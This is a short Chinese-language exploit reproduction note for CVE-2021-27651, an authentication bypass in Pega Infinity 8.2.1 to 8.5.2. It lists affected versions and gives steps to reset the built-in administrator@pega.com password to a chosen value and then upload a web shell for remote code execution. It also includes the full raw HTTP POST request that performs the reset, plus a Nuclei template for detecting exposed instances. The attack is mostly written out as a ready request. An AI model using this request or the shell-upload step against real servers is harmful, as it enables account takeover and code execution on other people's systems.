# PEGA pega infinity 授权认证绕过RCE（CVE-2021-27651）

PEGA pega infinity是美国PEGA公司的一个应用软件。提供从数字混乱过渡到真正的数字转换。Pega Infinity 8.2.1版本至8.5.2版本存在授权问题漏洞，该漏洞源于本地帐户的密码重置功能可以用来绕过本地认证检查。

影响版本：

* Pega Infinity > = 8.2.1
* Pega Infinity <= 8.5.2

**复现：**

1.访问任何实例登录页面，使用"administrator@pega.com"进行重置密码进行登录,PoC如下，重置密码为：Rules@1234进行登录后上传shell进行rce。


```
POST /prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD HTTP/1.1 (:PEGA_ID is a unique ID for each site, it is in this format: ZOgwf2Zk3OsEg_oG74MXXxG2bXKbv56W)
Host: redacted.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:85.0) Gecko/20100101 Firefox/85.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 112
Origin: https://redacted.com
DNT: 1
Connection: close
Referer: https://redacted.com/prweb/PRServlet/app/default/:PEGA_ID*/!STANDARD
Cookie: yourCookie
Upgrade-Insecure-Requests: 1

pzAuth=guest&NewPassword=Rules%401234&ConfPassword=Rules%401234&pyActivity%3DCode-Security.pzChangeUserPassword=
```

Nuclei Template：


```
id: pega

info:
  name: Pega Infinity Login
  author: sshell
  severity: low

requests:
  - method: GET
    path:
      - "{{BaseURL}}/prweb/PRRestService/unauthenticatedAPI/v1/docs"
    headers:
      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55
    matchers:
      - type: word
        words:
          - "Pega API"

```

ref：

* https://github.com/samwcyo/CVE-2021-27651-PoC/blob/main/RCE.md
* https://nvd.nist.gov/vuln/detail/CVE-2021-27651
* http://www.cnnvd.org.cn/web/xxk/ldxqById.tag?CNNVD=CNNVD-202104-2150
